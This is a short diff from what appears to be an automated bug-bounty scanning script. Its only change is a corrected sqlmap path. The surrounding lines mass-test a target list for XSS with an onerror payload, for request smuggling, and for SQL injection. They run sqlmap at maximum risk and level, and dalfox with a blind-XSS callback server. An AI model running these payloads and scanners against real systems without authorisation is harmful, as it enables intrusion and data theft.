@@ -132,7 +132,7 @@ runInjections() {
     cat patterns/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q xssOutput.txt &> /dev/null
     cat patterns/xssPatterns.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q kxssOutput.txt &> /dev/null
     cat $targetList | xargs -P 50 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --log smuggleOutput.txt --quite 2> /dev/null" &> /dev/null
-    cat checkSQLI.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=sqlmapOutput/ 2> /dev/null" &> /dev/null
+    cat checkSQLI.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=sqlmapOutput/ 2> /dev/null" &> /dev/null
     if [ -n "$bServer" ]
         then
             dalfox file patterns/xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $threads -b $bServer 2> /dev/null | anew -q dalfoxOutput.txt &> /dev/null
